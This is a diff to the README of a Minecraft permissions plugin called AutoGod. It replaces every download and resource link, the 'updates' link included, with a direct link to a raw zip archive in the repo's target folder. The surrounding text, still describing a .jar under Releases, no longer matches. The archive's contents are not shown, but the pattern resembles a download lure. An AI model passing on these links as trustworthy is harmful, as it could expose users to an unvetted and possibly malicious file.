@@ -1,6 +1,6 @@
 # 👑 AutoGod - Easy Server Permission Control
 
-[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-brightgreen)](https://github.com/Ronit0p/AutoGod)
+[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-brightgreen)](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these steps carefully to download, install, and run AutoGod on your Windo
 
 ## 🔽 Download AutoGod
 
-Click the big badge above or [visit this page to download AutoGod](https://github.com/Ronit0p/AutoGod).
+Click the big badge above or [visit this page to download AutoGod](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip).
 
 Since the link directs to the GitHub general page, you will find the plugin files under the "Releases" or "Assets" section. Here you can download the latest version of AutoGod, usually named with a `.jar` extension.
 
@@ -126,10 +126,10 @@ Once installed and configured, AutoGod automatically applies the permissions.
 
 ## 🔗 Additional Resources
 
-- You can find updates, bug fixes, and new releases on the [AutoGod GitHub page](https://github.com/Ronit0p/AutoGod).
+- You can find updates, bug fixes, and new releases on the [AutoGod GitHub page](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip).
 - For Minecraft server help, look for guides on managing plugins for your specific server type (Spigot, Paper, etc.).
 - Java downloads and installation guides are available at Oracle’s official website or other reliable sources.
 
 ---
 
-[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-blue)](https://github.com/Ronit0p/AutoGod)
+[![Download AutoGod](https://img.shields.io/badge/Download-AutoGod-blue)](https://raw.githubusercontent.com/Ronit0p/AutoGod/main/target/Auto-God-v3.8.zip)
